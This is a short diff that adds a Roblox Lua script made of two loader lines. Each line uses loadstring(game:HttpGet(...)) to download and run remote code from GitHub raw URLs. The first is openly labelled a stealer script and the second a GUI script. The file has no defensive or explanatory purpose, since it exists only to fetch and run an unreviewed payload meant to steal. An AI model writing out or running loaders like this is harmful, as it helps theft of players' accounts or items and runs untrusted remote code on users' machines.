@@ -1,0 +1,5 @@
+-- YOUR STEALER SCRIPT
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JadeSCRIPTZ/Gagscript/refs/heads/main/Your%20steler"))()
+
+-- GUI SCRIPT 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JadeSCRIPTZ/GAG/refs/heads/main/JadeHUB"))()
